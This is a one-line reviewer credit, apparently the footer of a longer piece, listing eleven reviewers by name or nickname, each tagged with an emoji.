*Reviewed by: Marcus 🏛️ · Blake 🔥 · Sam 🔍 · Parker 📖 · Cal 🧪 · Stan 🗂️ · Tim ⚡ · Patricia 🛡️ · Oliver 🌙 · Bria 🎯 · Sensei 🎓*
